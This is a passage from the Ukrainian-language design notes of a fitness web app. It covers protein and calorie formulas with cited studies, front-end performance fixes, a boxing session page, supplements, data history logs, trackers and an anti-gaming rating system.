Ці числа — **практична конвенція**. Досліджень, які вимірювали б максимальну
швидкість набору сухої маси за стажем, немає, тому поруч показано діапазон
(×0,6…×1,4), а не одна цифра.

Сама ідея стелі перевірена: у Garthe 2013 група з вищою калорійністю набрала
втричі більше ваги, а приріст сухої маси між групами не відрізнявся
([PMID 23679146](https://pubmed.ncbi.nlm.nih.gov/23679146/)).

> Тут раніше стояли ще два голі номери — 31482093 і 37914977 — без жодного слова
> про те, що саме кожен показав, і одразу після фрази «досліджень немає». Це
> порушувало власне правило проєкту з `research.html`: «для кожного вказано, що
> воно показало». Номери прибрано, бо описати їх не було з чого.

### Білок — 1,6…2,2 г на кг маси тіла

Ціль — верх діапазону (2,2 г/кг), підлога на дефіциті — 1,6 г/кг. Для 70 кг це
**112–154 г** на добу.

Обидві межі — з одного рядка мета-аналізу Morton 2018
([PMID 28698222](https://pubmed.ncbi.nlm.nih.gov/28698222/)):
`break point = 1.62 (1.03, 2.20) g/kg/day`. 1,6 — точкова оцінка виходу на плато,
далі приріст сухої маси від додаткового білка не росте; 2,2 — верхня межа 95%
довірчого інтервалу до неї. Тобто діапазон — це не «мінімум і запас навмання»,
а ширина невизначеності однієї цифри.

> Раніше верх стояв 2,0 г/кг і обґрунтовувався як «запас на дефіцит» — числом без
> джерела. Тепер обидві межі читаються з тієї самої дужки в тій самій роботі.

**Стеля 35% калорійності** важливіша за формулу «г на кг» і перебиває її. Без неї
при великій вазі виходили абсурдні числа: 150 кг → 300 г білка = 44% усієї
енергії, а профіль 120 кг / 120 см / 90 років на агресивному дефіциті давав
**63,7% енергії з білка** — це вже зона, де описана білкова інтоксикація.

> Коментар у коді довго посилався на Helms 2014 (PMID 24864135) як на
> обґрунтування «2 г/кг маси тіла». Посилання було хибне: та робота говорить про
> **2,3–3,1 г на кг сухої маси**, і `research.html` цитує її правильно. Від
> загальної маси вона реалізацію не підтверджує, тому джерело замінено на те,
> яке справді підтверджує.

### Підлога калорійності

Ціль ніколи не опускається нижче **базового обміну** і нижче **1200 ккал для
жінок / 1500 для чоловіків** — спрацьовує вища з двох меж, і про спрацювання
сторінка каже вголос, а не мовчки обрізає.

Доти, доки підлоги не було, відсоток застосовувався до TDEE без жодного обмеження:
у межах, які дозволяє форма, знаходилось **2475 комбінацій із ціллю нижче 1200 ккал
і 2240 — нижче базового обміну**. Жінка 50 кг, 160 см, сидяча робота, агресивне
схуднення отримувала ~1025 ккал/добу без жодного попередження.

### Що з цього видно на екрані

Для 80 кг, стаж 1–3 роки, за рік:

| | вага | мʼязи | жир |
|---|---|---|---|
| Набір (+12%) | +15,9 кг | +5,4 | +10,5 |
| Агресивний (+20%) | +26,5 кг | **+5,4** | +21,1 |

Мʼязів однаково. Уся різниця — жир. Це і є відповідь на питання «на скільки їсти».

Стаж зберігається в профіль: той самий, що керує прогнозом робочих ваг
на `plan.html`. Двох полів для нього немає.

## 9. Продуктивність і стійкість

Правки, які не видно, але без яких сайт поводиться гірше.

### Сторінка не має зникати без JS

`.reveal` ховає блоки (`opacity: 0`) і показує їх при скролі. Раніше це правило
діяло беззастережно — і будь-яка помилка в скриптах лишала сторінку **візуально
порожньою**: контент був у DOM, але прозорий.

Тепер приховування прив'язане до класу `.js`, який ставить вбудований скрипт
у `<head>`. Немає JS — немає й приховування, усе видно одразу.

```css
.js .reveal { opacity: 0; ... }
```

Там же — повага до `prefers-reduced-motion`: хто вимкнув анімації в системі,
той не чекає на появу блоків.

### Шрифти не блокують перший показ

Google Fonts підключені через `media="print"` + `onload`, тож браузер не чекає
на сторонній домен перед першим малюванням. Для випадку без JS є `<noscript>`.

### Постери на першому екрані

Карусель стоїть угорі головної, тому перші видимі слайди мають
`loading="eager" fetchpriority="high"`, а решта — `lazy`. Лінива загрузка того,
що вже в кадрі, лише додає зайвий крок. У `<img>` проставлені `width`/`height`.

### Поділ nutrition.js

Формули винесені в `js/nutrition-core.js` (9 КБ). Сторінка «Раціон» бере звідти
`targetFor` і схему прийомів, і більше не тягне 24 КБ інтерфейсу калькулятора.
Файл спільний для двох сторінок, тож із кешу він береться один раз.

### Прийоми їжі: одна схема на дві сторінки

Кількість і назви прийомів задаються **в одному місці** — перемикачем
«Розподіл на прийоми їжі» на `nutrition.html` (3–6). Значення лягає в
`profile.meals`, назви дає `NutritionCalc.mealNames()`, і «Раціон» будує
рівно ті самі картки.

До цього раціон вів власний список: три захардкоджені назви, кнопки
«Додати прийом» / «✕» і поле перейменування. Через це в калькуляторі могло
стояти 5 прийомів, а в раціоні — три свої, і розкладка КБЖВ по прийомах ні
на що не спиралась. Перейменування, додавання й видалення прийомів
прибрані: правити тут те, що задається там, означало б знову розвести
два джерела.

Якщо кількість прийомів у профілі **зменшилась**, зайві картки зникають, але
їхній вміст переїжджає в останній прийом — `applySchema()` у `js/meals.js`.
Втратити набрану їжу через перемикач на сусідній сторінці не можна.

### Чого свідомо НЕ робив

- **Мініфікації немає.** Це вимагало б збірки, а сайт має відкриватись подвійним
  кліком по `index.html`. На реальному хостингу gzip дає більший ефект безкоштовно.
- **`js/programs-data.js` (67 КБ) не чіпав.** Це дані планів, а не код: скорочувати
  їх означає викидати вправи.

## 9а. Бокс (`boxing.html`)

**Одна готова сесія, а не програма.** Тут немає тижнів, циклів, робочих ваг,
прогресії й збереження в профіль — і це свідомо. Сторінка ні з чим не
звʼязана: ні з планом тренувань, ні зі статистикою, ні з Get Stronger Rating, ні з
календарем. Її відкривають перед залом і виконують зверху вниз — у будь-який
день, коли захотілось побити мішок.

`js/boxing-data.js` — дані, `js/boxing.js` — показ. Той самий поділ, що в
програмах, рецептах і добавках.

### Структура

Пʼять секцій: розминка (8–10 хв) → техніка (10–12 хв) → тіньовий бій (2 × 3 хв)
→ **мішок (6–8 × 3 хв)** → завершення (5 хв). Перші три — підготовка; мішок —
основна робота, і на сторінці він єдиний винесений із загальної картки в окрему
сітку карток-раундів.

Раунди **7 і 8 опціональні** — позначені класом `.card--optional` (пунктирна
рамка) і підписом «· опціональний». Це не «вимкнено»: сесія повноцінна після
шостого, а кондиційний і фристайл-раунди мають сенс лише поки техніка тримається.

### Одне джерело для екрана й для нотатки

`sessionText()` живе поруч із даними і не має доступу до DOM. Це важливо не
заради чистоти: якби текст для буфера збирався з розмітки або писався окремо,
він розійшовся б із тим, що на екрані, — і помітити це можна було б уже в залі.
Тест `tests/boxing.test.js` перебирає **кожен** пункт даних і вимагає, щоб він
був у тексті.

Копіюється **чистий текст**, а не HTML — на відміну від плану тренувань, де
копіюється таблиця і розмітка доречна. Структура тут лінійна, а Notes при
вставці HTML тягне за собою чужі кеглі й кольори. Використовується наявний
`App.copyRich` із трьома рівнями запасних шляхів: `ClipboardItem` → виділення
`contenteditable` → `textarea` + `execCommand`. Якщо не спрацював жоден,
показується `#copy-fallback` із текстом для виділення вручну — той самий патерн,
що на сторінці «Мій план».

### Чого тут немає

**Таймера.** Готової системи відліку в проєкті не існує, а робити її заради
однієї сторінки — це нова підсистема на порожньому місці. Формат 3/1 написаний
у шапці, далі підходить будь-який таймер на телефоні.

### Адаптив: дві пастки, на які я наступив

`minmax(320px, 1fr)` у сітці раундів давав горизонтальний скрол на екрані 320px:
жорсткий мінімум колонки ширший за контейнер із полями. Лікується `min(320px,
100%)`. Те саме з `.grid-2` (мінімум 280px) усередині картки з полями 32px —
на інших сторінках він лежить прямо у `.wrap`, де полів менше, і там вистачає,
тому глобальний клас не чіпав, а задав власні колонки локально.

Друга: у шапці картки раунду `.row` переносив чип «3:00» під заголовок у вузьких
картках, і в сусідніх раундах час стояв на різній висоті. `flex-wrap: nowrap` +
`flex: 0 0 auto` на чипі.

## 10. Добавки

`js/supplements.js` — дані, `js/supplements-view.js` — показ. Пʼять позицій,
12 джерел із PubMed.

### Рівень доказовості — про надійність, а не про користь

```js
evidence: 'strong' | 'moderate'
```

- **strong** — багато РКД і мета-аналізів, ефект відтворюється (креатин, білок)
- **moderate** — ефект є, але вибірки малі або він залежить від умов (ашваганда, мелатонін, магній)

**Рівня `weak` більше немає.** Він існував і містив EAA, коензим Q10 та NAC.
Тримати на сторінці позиції, про які сам же пишеш «не показано, що це працює
для того, заради чого купують», означає перетворювати довідник на каталог.
Якщо для них зʼявляться сильніші дані — повернуться разом із рівнем.

### Розділ «Поширені твердження»

Окремий блок, де розібрані фрази, що зазвичай супроводжують ці банки, з вироком
«підтверджено / частково / не підтверджено» і посиланнями. Він потрібен саме тому,
що описи на етикетках формально не брешуть, але зсувають зміст: у мелатоніну
ефект реальний, проте це 7 хвилин швидшого засинання, а не снодійне.

### Поле `howMade`

Необовʼязковий масив кроків, який рендериться акордеоном «Як це роблять».
Заповнений у креатину й протеїну — там, де процес виробництва пояснює,
за що саме доплачуєш:

- **протеїн** — сироватка як залишок від сироваріння, ультрафільтрація до
  концентрату, мікрофільтрація або іонний обмін до ізоляту, розпилювальне
  сушіння. Плюс пояснення, що «денатурований» ≠ «зіпсований»;
- **креатин** — хімічний синтез, що насправді означає марка Creapure
  (контроль побічних продуктів, а не окрема форма креатину).

### Форматування у висновках

`finding` і `howMade[].text` можуть містити `<b>` для виділення ключових цифр.
Рендер проганяє їх через `richText()`: екранує все, а потім повертає рівно `<b>`.
Не «довіряємо своєму тексту», а явно дозволяємо один тег.

### Безпека — обовʼязкове поле

У кожної добавки є `safety`, і воно рендериться помітним блоком, а не дрібним
шрифтом унизу. Найважливіший випадок — ашваганда: задокументовані випадки
ураження печінки ([PMID 31991029](https://pubmed.ncbi.nlm.nih.gov/31991029/)),
один з них із трансплантацією.

### Ціни

`price: { usd, amount, servings }` → вартість добової дози рахується як `usd / servings`.
Числа орієнтовні й потрібні лише щоб порівнювати банки між собою.

## 11. Акаунт як єдине місце редагування

Раніше дані профілю правились там, де їх колись увели: вага — в харчуванні,
пульс — у кардіо, стаж — у прогнозі. Тепер усі **скалярні** поля редагуються
на `account.html`, а решта сайту їх звідти читає.

Що редагується: стать, вік, зріст, вага, % жиру, активність, мета, прийоми їжі,
днів у залі, стаж силових, пульс спокою й максимальний, рекорди 1ПМ.

Що **не** редагується: сам план тренувань. Це не число, а структура з днями
й вправами, у якої є власний редактор на `plan.html`. На акаунті показано лише,
який план обрано, з посиланням туди.

### Збереження

Пишеться з затримкою 400 мс після останнього натискання. Без цього ввід «180»
зберігав би профіль тричі, встигнувши побувати «1» і «18».

Порожнє поле дає `null`, а не `0`: вага 0 кг і «вагу не вказано» — різні речі,
і нуль зіпсував би розрахунки.

Рекорди 1ПМ лежать у вкладеному обʼєкті, тому патч зливається з наявним,
а не перетирає його.

### Чому список цілей не дублюється

`goalOptions()` бере цілі з `window.NutritionCalc.GOALS`. Якщо додати мету
в калькулятор, вона сама зʼявиться на акаунті — двох списків, які можуть
розʼїхатись, тут немає. Тому `account.html` підключає `js/nutrition-core.js`.

### Що означає «підтягується одразу»

- `Store.saveProfile()` тепер викликає `emit()`. **Раніше не викликав** — через
  це підписники `Store.onChange` мовчали при кожному збереженні профілю.
- Додано слухач події `storage`: зміна в одній вкладці скидає кеш і сповіщає
  інші вкладки того самого сайту.
- Сторінки, які перемальовуються на цю подію: акаунт і раціон. Обидві спершу
  перевіряють, чи не у фокусі зараз поле — інакше перемальовування вибивало б
  курсор посеред набору числа.
- Решта сторінок читає профіль при завантаженні. Це свідомо: перемальовувати
  редактор плану під руками означало б втрачати незбережені правки.

## 11а. «Сьогодні» (`today.html`) і жива головна

### Розділення «налаштувати» і «виконати»

«Мій план» — редактор: таблиці, правки, обʼєм, прогноз. «Сьогодні» —
виконання: один день плану вертикальним списком із великими зонами дотику,
робочі ваги з `profile.weights`, таймер відпочинку і галочки виконання.
Сторінка нічого не редагує — будь-яка зміна робиться на «Моєму плані» й
одразу видна тут, бо джерело одне (`profile.customPlans` + `PROGRAMS`,
той самий ключ `programId:days`).

Галочки — **стан дня, а не історія**: живуть у localStorage разом із датою
і зникають наступного дня. Новий день пропонує наступний день плану після
того, що робили востаннє, — це підказка, з якої картки почати, а не журнал.

### Таймер відпочинку став спільним

Раніше жив усередині `js/programs.js`; тепер — `window.App.restTimer`
(`start(sec, name)` / `stop()`), і ним користуються «Мій план» і «Сьогодні».
Поведінка не змінилась: плаваючий віджет, відлік від міток часу, гудок,
вібрація, разова позначка дня в журналі.

### Головна — панель дня (етап 7)

Головна більше не афіша з героєм на пів-екрана й сіткою з девʼяти карток-
посилань. Вона відповідає на одне питання: **що в мене зараз відбувається**.

Зверху — дата як заголовок сторінки (слово Get Stronger стоїть у шапці двома
сантиметрами вище; повторювати його там, де найкраще місце екрана, немає
сенсу). Далі три шари:

1. **Головна дія дня** (`.dash-main`) — найважча картка на сторінці. Без
   обраного плану — «обери програму»; з планом — програма й стан тренування
   зі смугою виконання.
2. **Плитки стану** (`.tile`) — харчування (набрано/ціль + залишок), вага з
   дельтою, Get Stronger Rating із рівнем, трекери (скільки відмічено сьогодні).
   Плитка трекерів зникає, якщо жоден не ввімкнено: «0 з 0» місце займає,
   а не каже нічого.
3. **Перелік розділів** — компактні посилання-пігулки, а не картки.
   Повна навігація вже є в шапці й футері.

Свідомо мало показників. Панель відповідає на «що робити зараз», а не
«що я взагалі можу знати про себе»; деталі лишаються на своїх сторінках.

Джерело кожної цифри — чуже: `PROGRAMS`, `DayCore`, `NutritionCalc`,
`TrackerCore`, кеш `profile.ratingLog`. Власних розрахунків у `js/home.js`
немає жодного. Стан сьогоднішнього тренування читається з
`profile.sessionLog[сьогодні]` (історія, яку пише «Сьогодні») або з
`localStorage 'forge.today'` — правило «наступний день після минулого»
лишається в `js/today.js` і не дублюється.

### Арифметика дня — `js/day-core.js`

Суму дня раціону тепер рахують три сторінки (раціон, «Сьогодні», головна),
тому вона винесена в чистий модуль без DOM: `dayTotals(day, userRecipes)`,
`perContainer(recipe)` тощо. `js/meals.js` делегує йому свою арифметику —
джерело одне. Покрито тестами (биті id дають нуль внеску, а не NaN).

### Раціон: короткий шлях у день

У блоці «День» зʼявилось поле «Додати в день»: пошук одразу по продуктах
і рецептах, вибір відкриває ту саму модалку маси/прийому. Довідник угорі
лишився для перегляду — щоденна операція більше не вимагає його розгортати.

Модалка тепер тримає фокус (Tab циклиться всередині, Escape закриває,
фокус повертається туди, звідки вікно відкрили) — `aria-modal` перестав
бути декларацією.

## 11б. Памʼять: історія даних (етап 2)

Раніше профіль був знімком поточного стану, і історію вели лише два журнали
журналу (bodyLog, workLog). Тепер історія — властивість системи. Три нові
журнали, форма записів — `js/history-core.js` (чисті функції, під тестами):

| Журнал | Форма | Хто пише |
|---|---|---|
| `weightLog` | `{ 'Вправа': [ {d, kg}, … ] }` — append-only серії | «Мій план»: правка ваги, ±кг, деолоад, повернення, +10% |
| `sessionLog` | `{ 'YYYY-MM-DD': {programId, days, dayIdx, title, done, total} }` | «Сьогодні»: з першою галочкою, з дебаунсом |
| `mealLog` | `{ 'YYYY-MM-DD': {kcal, p, f, c, fiber, target?} }` | «Раціон»: кнопка «Закрити день» |

Принципи:

- **Поточне значення й історія — різні поля.** `weights` лишився поточним
  (його читають план, періодизація, прогноз) — `weightLog` каже, як він
  сюди прийшов. Жодного дубля джерел: значення пишуться однією дією.
- **Append-only з одним винятком:** повторна зміна В ТОЙ САМИЙ день замінює
  сьогоднішній запис (десять правок за вечір — одна зміна, а не десять).
- **Історія памʼятає контекст свого дня.** У `mealLog` зберігається ціль,
  що діяла САМЕ ТОГО дня: профіль зміниться, а колонка «до цілі» в історії
  лишиться правдивою.
- **Деолоади не ховаються.** Скидання ваг пише записи в журнал — провал на
  графіку вправи це чесна частина шляху, а не шум.
- **Видалення вправи з плану не стирає її історію.**

### Міграція (SCHEMA_VERSION 1 → 2)

`migrate()` у store.js: старі профілі отримують порожні журнали, а
`weightLog` засівається з поточних `weights` одним записом на вправу з
СЬОГОДНІШНЬОЮ датою — чесніше не вигадувати минуле, якого ніхто не
записував. Позначка `weightLogSeeded` не дає засіву крутитись повторно
(той самий урок, що з `weightsHarvested`). Старі поля не рухаються.

### «Закрити день» у раціоні

Головна дія дня: підсумок (ккал/Б/Ж/В/клітковина + ціль) лягає в
`mealLog`, день очищається під наступний. «Очистити» лишилась для
помилково набраного дня — без запису. Повторне закриття того самого дня
перезаписує запис після підтвердження.

### «Журнал» став «Прогресом»

Та сама сторінка `journal.html`, але тепер це центр історії: вага тіла
(як і була), теплокарта тренувань (світиться і від таймера, і від сесій
«Сьогодні»), **робочі ваги** (спарклайн + дельта від першого запису по
кожній вправі, свіжі зміни вгорі) і **харчування** (останні закриті дні
проти цілі свого дня). Сторінка лише читає — пишуть її розділи-джерела.

### Основа для «прогноз проти факту»

Дані для звірки вже накопичуються датованими: weightLog (факт сили),
bodyLog (факт маси), mealLog з target (факт калорій проти цілі). Сама
звірка — наступний етап; цей поклав під неї структуру.

## 11в. Аналітика та Прогрес (етап 3)

Етап 2 навчив Get Stronger памʼятати. Етап 3 навчив його читати те, що
запамʼятав, і відповідати на одне питання за кілька секунд: **я
прогресую чи ні?** Нового сховища немає — `js/progress-core.js` лише
зводить пʼять існуючих журналів (bodyLog, weightLog, workLog,
sessionLog, mealLog) у висновки. Чисті функції, без DOM, під тестами
(`tests/progress-core.test.js`, 15 тестів).

### Огляд — перший екран

`#jr-overview` угорі «Прогресу»: чотири плитки — **вага** (зміна за
30 днів), **сила** (найбільший приріст вправи за 8 тижнів, з назвою),
**тренувань цього тижня** (із дотриманням плану, якщо план обрано) і
**харчування** (середнє ккал проти цілі). Кожна плитка чесно каже
«ще без записів», якщо даних не вистачає — жодних нулів, що
вдають факт. Деталі — нижче, за бажанням: «Overview → детальніше», а
не 15 графіків одразу.

### Прогноз проти факту

Головна нова здатність: коридор очікуваної ваги поверх звичайного
графіка ваги тіла (не окремий графік — той самий, пунктиром). Якір —
перший запис періоду; межі коридору — ті самі відсотки на тиждень, що
написані людям у `GOALS.rate` (`js/nutrition-core.js`), тепер як
числа: `bulk` 0,25–0,5%/тиж, `bulkfast` 0,5–0,8%, `cut` −1…−0,5%,
`cutfast` −0,9…−0,7%; `maintain`/`recomp` — абсолютні ±0,5 кг, бо
«стабільно» міряють у кілограмах, а не у відсотках. Ріст — складний
відсоток (від поточної ваги щотижня), не лінійний.

Під графіком — рядок мовою вердикту, не приводу для тривоги: «Прогноз
проти факту за 4 тиж: модель очікувала +0,7…+1,4 кг, фактично
+1,4 кг — у межах моделі». Три вердикти: `within` / `above` / `below`.
Чесні відмови — коридор НЕ малюється: без обраної цілі, менш як за
3 записи в періоді, чи період коротший за 14 днів (сигнал від шуму
води за тиждень ще не відрізнити). Модель — це модель, а не обіцянка:
жодних порад, тільки де факт стоїть відносно очікування.

### Сила: розгортання замість окремих сторінок

`liftStats()` рахує все за назвою вправи над тим самим `weightLog`:
першу/останню вагу, приріст (кг і %), рекорд і чи ним є поточна вага
(один-єдиний запис — точка відліку, а не рекорд). Список вправ на
«Прогресі» — згорнутий: рядок показує спарклайн і поточну вагу,
клік розгортає повну історію («80 → 85 → 76 → 90 кг», з деолоадом
видно як провал, а не як помилку) і статистику. Одна сторінка,
скільки завгодно вправ — не файл на кожну.

### Тренування і харчування — тільки те, що є

`trainingStats()` рахує тренувальні дні з `workLog` і `sessionLog`
разом (без подвійного рахунку), тиждень рахується з понеділка;
дотримання плану — за останні 6 повних тижнів проти `daysTarget`,
і воно відсутнє зовсім, якщо плану немає (вигадувати ціль нема з
чого). `foodStats()` рахує середні ккал/білок і частку днів у межах
±5% від цілі — **лише серед днів, де ціль узагалі була**: день без
цілі не тягне статистику ні вгору, ні вниз.

### Що навмисно НЕ зроблено

Трекери (сон, кроки, вода, самопочуття), Apple Health, гейміфікація,
досягнення, Get Stronger Rating/ELO, соціальний рейтинг, AI-поради — жодного
з цього тут немає. Дані вже датовані й лежать по днях, тому додати
кореляції (сон → відновлення → сила, ккал → вага) пізніше — питання
нового модуля читання, не нової архітектури. Але сам модуль — окремий
етап, не цей.

## 11г. Модульні трекери (етап 4)

Одна система на всі трекери, а не окрема реалізація на кожен. Ключова
ідея — Get Stronger нічого не трекає без дозволу: людина сама вмикає те, що їй
треба, решта не займає екран.

### Модель

`js/tracker-core.js` — чисті функції, під тестами. Дві структури в
профілі:

| Що | Форма | Приклад |
|---|---|---|
| `trackers` | `{ id: {id,type,name,enabled,settings,goal,source,order,createdAt} }` | реєстр: що є й що увімкнено |
| `trackerLog` | `{ id: {'YYYY-MM-DD': value} }` | дані — та сама форма, що bodyLog/workLog |

`value` залежить від `kind` трекера: число (вода, кофеїн, кроки, сон
у хвилинах, настрій/recovery 1–10), пара `{field: число}` (біль/втома;
настрій до/після тренування) або `true` для булевих (добавка/звичка —
відсутність запису й означає «ні», окремого прапорця не треба).

**Новий тип трекера — рядок у `TRACKER_DEFS`, більше нічого.** Каталог
описує `kind`, межі, крок, чи є ціль за замовчуванням, чи має сенс
джерело даних. `ensureBuiltins()` дотягує реєстр профілю до каталогу
при кожному читанні — не одноразовою міграцією: якщо наступний етап
додасть, наприклад, трекер сну по фазах, він з'явиться в списку сам,
без нової міграції й без ризику скинути чиїсь вимкнені трекери.

### Убудовані трекери

Вода, сон, настрій, кроки, кофеїн, recovery, біль/втома (дві шкали
в одному записі), настрій до/після тренування (прив'язаний до
сьогоднішньої сесії, а не до дня загалом — Get Stronger веде одне тренування
на день, тому дата дня і є ідентифікатором сесії). Плюс два
користувацькі типи без обмеження кількості — **добавки** й **звички**:
людина сама створює скільки завгодно іменованих позицій, кожна —
окремий Tracker зі своїм `id`.

За замовчуванням увімкнені чотири: вода, сон, настрій, recovery —
решта чекає, поки людина сама їх увімкне на «Моїх трекерах»
(`trackers.html`, у шапці під «Інше», щоб не займати основний рівень
навігації — «одна модульна сторінка, а не вкладка на кожен трекер»).

### Увімкнено / вимкнено

Перемикач на `trackers.html` пише `trackers[id].enabled`. Вимкнений
трекер зникає з «Сьогодні» й «Прогресу», але **історія лишається** —
вимкнення не видаляє `trackerLog`, це лише «не показуй». Розгорнутий
рядок трекера показує ціль (де є за замовчуванням — вода/сон/кроки),
джерело (де є сенс) і останні 7 записів з можливістю видалити
помилковий.

### Дані: SCHEMA_VERSION 2 → 3

`migrate()` у `store.js` лише гарантує, що `trackers`/`trackerLog` —
обʼєкти (як і решта журналів). Сам каталог убудованих трекерів там
свідомо НЕ засівається — цим займається `ensureBuiltins()` на льоту
(див. вище): міграція «раз назавжди» тут була б крихкішою, ніж ліниве
дотягування при кожному відкритті.

### «Трекери» (`trackers.html`): швидкий ввід

Раніше цей блок жив на «Сьогодні» й робив головну довгим списком шкал,
а плитка «Трекери» вела в НАЛАШТУВАННЯ — не туди, куди чекаєш. Тепер
ввід — окрема сторінка, куди веде плитка на «Сьогодні»; налаштування —
посиланням праворуч угорі (`trackers-settings.html`).

Кожен увімкнений трекер — один рядок: назва, сьогоднішнє значення,
мінімальна дія. Кнопки-пресети для накопичувальних (вода +0,25/+0,5/+1 л,
кофеїн +30/+80/+150 мг), два поля «год» і «хв» для сну (довільне число,
без сітки пресетів), кнопки 1–10 для настрою/recovery/болю-втоми,
число для кроків. Одна дія — і значення записане. Настрій до/після
тренування живе на сторінці тренування, а не тут: він про сесію, не про
день.

### Progress: підсумок, не перевантаження

`#jr-trackers` на «Прогресі» — по одній плитці на увімкнений трекер:
середнє виконання цілі у % (де є ціль), середнє за період і простий
тренд (↑/↓/→ — друга половина періоду проти першої, без прогнозів).
Секція взагалі не рендериться, якщо жоден трекер не увімкнено. Повна
історія й налаштування — посиланням на «Мої трекери»: «Overview →
детальніше за бажанням» діє тут так само, як у решті сторінки.

### Apple Health: підготовлено, не імітовано

Сон і кроки мають поле `source: 'manual' | 'appleHealth'`. Веб-версія
Get Stronger фізично не має доступу до Apple Health, тому інтерфейс НЕ показує
робочого перемикача на другий варіант — лише неактивну підказку «зʼявиться
в мобільному застосунку». Імітувати перемикач, який нічого не робить,
гірше, ніж не показувати його: людина не мала б чекати даних, яких
ніхто не пише. Коли зʼявиться мобільний застосунок, він писатиме
`source: 'appleHealth'` у той самий запис — форма даних для цього вже
готова, міняти нічого не доведеться.

### Звички

Окремий тип (`type: 'habit'`), та сама булева форма даних, що в
добавок. Streak рахується від сьогодні назад: якщо сьогодні ще не
позначено, день не програний, поки не скінчився, — лічильник рахує від
учора. Без нагород за серію: це навмисно (гейміфікація — окремий,
останній етап).

### Свідомо не зроблено на цьому етапі

Apple Health повністю, ELO, досягнення, медалі, маскот, скіни, нагороди,
leaderboard, соціальні функції — жоден трекер (біль, настрій, recovery,
сон, втома) не робить медичних висновків: лише показує факт, який
людина сама записала. Get Stronger Rating — наступний етап (11ґ).

## 11ґ. Get Stronger Rating (етап 5) — ЗАМІНЕНО сезонним ELO (етап 6)

> Цей розділ описує стару локальну систему Get Stronger Rating. На етапі 6 її
> повністю замінив **сезонний ELO** (див. розділ 11д нижче): rating-core.js
> і rating.js видалені, `ratingLog` у профілі збережено лише як історичні
> дані. Розділ лишається як архівна документація рішень.

Особистий рейтинг дисципліни й прогресу — **не** лідерборд. Число
відповідає на «наскільки стабільно я тримаю ВЛАСНИЙ план», а не
«скільки я краще за когось». 10 рівнів, прозорий розклад «чому воно
змінилось», і навмисно жодної гейміфікації навколо самого числа —
про це нижче.

### Формула — одна, централізована

Уся математика — `js/rating-core.js`, чисті функції, під тестами.
Ніяких коефіцієнтів, розкиданих по сторінках: і «Сьогодні», і
`rating.html` викликають ті самі `tick()`/`recompute()` з тими самими
`RATING_CONFIG` вагами.

**Rating ≠ XP.** Це не «дія → +N очок назавжди». Кожен день рахується
заново від «оцінки якості» 0–100 за трейлінг-вікно (адгеренція плану,
регулярність харчування, напрямок прогресу, стабільність), а не від
кількості кліків:

1. Чотири сигнали (`trainingSignal`, `nutritionSignal`, `progressSignal`,
   `consistencySignal`) дають денну «якість» 0–100 (вагова сума —
   `RATING_CONFIG.weights`: тренування 40, харчування 25, прогрес 20,
   стабільність 15).
2. Якість порівнюється з `baseline` (50 — нейтральна точка, що не рухає
   Rating ні вгору, ні вниз).
3. Відхилення масштабується АСИМЕТРИЧНО: підйом ×0,8, падіння лише ×0,3
   (`posScale`/`negScale`) — тому один поганий день трохи хитає число,
   а не знищує його (§7 вимоги, детальніше нижче).
4. Результат клампиться денною підлогою/стелею (`dayFloor: -8`,
   `dayCeil: 35`) і додається до Rating, який ніколи не йде нижче нуля.

Жодного рандому, жодного AI — той самий `history` + `ratingSeen` завжди
дає той самий Rating (перевірено тестом «однакові дані → однаковий
Rating»).

### Джерела даних — те, що в Get Stronger вже є

| Сигнал | Що дивиться | Звідки |
|---|---|---|
| Тренування | Адгеренція плану за 28 днів + бонус «сьогодні тренувався» + штраф за відставання від темпу тижня | `workLog`/`sessionLog` (ті самі, що на «Прогресі») |
| Харчування | Частка закритих днів, влучання в ціль ККАЛ (реальна ціль ТОГО дня) і білка (поточна ціль профілю) | `mealLog` |
| Прогрес | Напрямок робочої ваги за 90 днів ВІДНОСНО власної історії кожної вправи + бонус за особистий рекорд саме сьогодні | `weightLog` через `HistoryCore.weightSeries/weightNames` |
| Стабільність | Стрік тренувань (капується 21 днем) + рівномірність інтервалів між ними за 28 днів | `workLog`/`sessionLog` |

«Прогрес відносний, а не абсолютний» — вимога явно перевірена тестом:
стабільне зростання з 60 кг і зі 140 кг дають ОДНАКОВИЙ внесок сигналу,
бо рахується напрямок відносно першого й останнього запису вправи, а не
сама вага.

Білок — єдине чесно назване наближення: `mealLog` історично зберігає
ціль ККАЛ ТОГО дня, але не ціль білка, тож `nutritionSignal` бере
ПОТОЧНУ білкову ціль профілю (через `NutritionCalc.targetFor`). Це
позначено прямо в коді, а не видається за історичний факт.

### 10 рівнів

`LEVEL_FLOORS` — фіксована драбина порогів Rating, `LEVEL_NAMES` —
нейтральні назви («Рівень 1»…«Рівень 10»), навмисно не творчі: легко
замінити конфігом, не чіпаючи логіку розрахунку.

| Рівень | Поріг Rating | Орієнтовний час (стабільна дисципліна) |
|---|---|---|
| 1 | 0 | старт |
| 2 | 1000 | ~2 місяці |
| 3 | 2500 | ~5 місяців |
| 4 | 4500 | ~9 місяців |
| 5 | 7000 | ~1,2 року |
| 6 | 10000 | ~1,7 року |
| 7 | 13000 | ~2,2 року |
| 8 | 16000 | ~2,7 року |
| 9 | 19000 | ~3,3 року |
| 10 | 22000 | ~3,8 року (~4 роки) |

Орієнтир — реалістична щоденна дельта ≈ +16 при якості ~70/100
(дисциплінована, але не ідеальна поведінка). Ранні рівні минають
швидко, середні вимагають місяців стабільності, Level 10 — ціль на
роки, а не бонус за кілька тижнів активного користування (§10, §18).

`levelFor(rating)` повертає рівень, назву, floor/ceil, прогрес і
`toNext` — той самий обʼєкт живить і компактний віджет на «Сьогодні», і
заголовок `rating.html`, і драбину 10 рівнів там-таки.

### Захист від накрутки

Головний вектор атаки через UI вже існує в продукті: клітинки
теплокарти на «Прогресі» клікабельні на БУДЬ-ЯКУ минулу дату (потрібно
для чесного «забув позначити»), тож наївна система рахувала б заднім
числом позначені 100 днів як 100 днів чесного тренування.

**`ratingSeen`** — реєстр «коли Rating ВПЕРШЕ побачив факт» (ключ
`'train:D'`/`'meal:D'`/`'lift:Назва:D'`), і пишеться СЬОГОДНІШНЬОЮ
датою, не датою факту. `factCounts()` зараховує факт, лише якщо його
вперше побачили не пізніше ніж `graceDays` (2 дні) після власної дати.
Задня фальсифікація (десятки кліків за одну сесію) не карається —
просто не рахується: вона завжди `seenAt` дуже далеко від дати факту.

Перевірено тестом: 100 заднім числом позначених днів в одній сесії
дають Rating не вищий за кілька чесних днів поспіль, а не «100 днів
адгеренції».

**Пастка, яку довелось виправити в процесі:** якщо тупо ставити всі
факти «побачено сьогодні» одразу при першому обчисленні для профілю,
місяці ЧЕСНОЇ історії (накопиченої іншими сторінками сайту задовго до
